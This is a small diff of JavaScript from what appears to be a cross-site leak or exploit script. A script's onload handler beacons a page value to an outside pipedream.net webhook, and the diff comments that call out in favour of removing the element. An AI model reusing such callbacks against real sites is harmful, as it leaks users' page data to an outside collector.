@@ -30,7 +30,8 @@
                 s.onload = (e) => {
                     console.log('Onload event triggered at ' + url);
                     // fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
-                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${document.getElementById('result')}`)
+                    // fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${document.getElementById('result')}`)
+                    e.target.remove()
                     return r(0)
                 }
                 s.onerror = (e) => {
